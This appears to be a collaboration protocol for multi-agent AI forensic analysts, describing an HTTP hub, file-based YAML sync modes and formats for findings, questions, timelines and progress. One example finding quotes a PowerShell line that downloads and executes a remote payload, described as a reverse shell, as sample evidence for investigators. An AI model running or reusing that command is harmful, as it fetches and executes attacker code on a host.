# Collaboration Protocol

> **Current protocol: v3 HTTP Hub** (`tools/collab_hub.py`). This document describes the legacy v2 file-based protocol using `shared/` and `tools/collab_sync.py`. The v2 protocol is retained as a fallback for offline/air-gapped scenarios where running an HTTP server is not possible.

## v3 HTTP Hub (Current)

Start the Hub on the coordinator's machine:

```powershell
python tools/collab_hub.py serve <case_dir> --port 8765 --bind 0.0.0.0
```

All roles (local and remote) communicate via REST API:
- `GET/POST /findings` — Evidence discoveries
- `GET/POST /progress` — Per-role progress tracking
- `GET/POST /answers` — Answer table (main designer maintains)
- `GET/POST /questions` — Cross-role Q&A routing
- `GET /session` — Full session snapshot (log + blockers + strategy)

See `prompts/main.md` Phase 4 for the complete API reference and usage examples.

---

## v2 File-Based Protocol (Legacy Fallback)

All multi-agent coordination happens through the `shared/` directory in the case workspace. Files are plain YAML — no special software needed.

### Sync Modes

#### Mode A: Single Machine (multiple windows)
All AI windows read/write the same local `shared/` directory. No sync needed.

#### Mode B: Internet (GitHub)
A case repo on GitHub holds the `shared/` directory. Each machine clones it.
```
# First time (Main Designer runs this once):
python tools/collab_sync.py git-init <case_dir> --repo https://github.com/team/case_xxx.git

# Each role does this periodically:
python tools/collab_sync.py git-pull <case_dir>       # before reading
python tools/collab_sync.py git-push <case_dir> -m "mobile: found trojan"  # after writing
```

#### Mode C: LAN (air-gapped / competition network)
One machine runs a simple HTTP sync server. Others pull/push via HTTP.
```
# On the "hub" machine (e.g., Main Designer's PC):
python tools/collab_sync.py lan-serve <case_dir> --port 9999

# On other machines:
python tools/collab_sync.py lan-pull <case_dir> --server 192.168.1.100:9999
python tools/collab_sync.py lan-push <case_dir> --server 192.168.1.100:9999
```

### CLI Shortcuts for Roles
```
# Post a finding (any mode):
python tools/collab_sync.py post <case_dir> --from mobile_analyst --summary "Trojan MD5=ABC" --detail "..." --related server_analyst

# Check overall status:
python tools/collab_sync.py status <case_dir>

# View answers table:
python tools/collab_sync.py answers <case_dir>
```

### File Formats

#### shared/findings.yaml
Append-only. Every role writes here when discovering something important.
```yaml
- id: F001
  time: "2026-05-05 14:23"
  from: computer_analyst
  type: evidence          # evidence | lead | artifact | question
  summary: "Found PowerShell reverse shell script connecting to 192.168.1.100:4444"
  detail: "Path: C:\\Users\\admin\\AppData\\Local\\Temp\\update.ps1\nContent: IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload')"
  related_to: [server_analyst, network_analyst]
```

#### shared/questions.yaml
Cross-role Q&A. Ask other roles to check something.
```yaml
- id: Q001
  time: "2026-05-05 14:30"
  from: server_analyst
  to: computer_analyst
  question: "Any SSH keys on the computer? I see SSH logins to the server from this IP."
  status: pending         # pending | answered
  answer: ""
```

#### shared/timeline.yaml
Shared timeline of key events, sorted by time.
```yaml
- time: "2026-05-05 03:15:00"
  event: "PowerShell script executed (Event ID 4688)"
  source: computer_analyst
  evidence: "Security.evtx"

- time: "2026-05-05 03:15:05"
  event: "TCP connection to 192.168.1.100:4444 established"
  source: network_analyst
  evidence: "capture.pcap stream #42"
```

#### shared/progress.yaml
Main reads this to track overall status.
```yaml
computer_analyst:
  status: working         # idle | working | done | blocked
  current_task: "Analyzing browser history"
  completed: ["Registry analysis", "Event log review"]
  pending: ["Browser history", "USB history"]

mobile_analyst:
  status: done
  completed: ["ALEAPP extraction", "WeChat analysis", "Call log review"]
  pending: []
```

### Rules
1. **Append-only**: Never delete or modify other roles' entries
2. **Be specific**: Include file paths, timestamps, exact values
3. **Tag related roles**: So they know to check your finding
4. **Answer questions promptly**: Check questions.yaml regularly
5. **Update progress**: Keep progress.yaml current so Main can coordinate
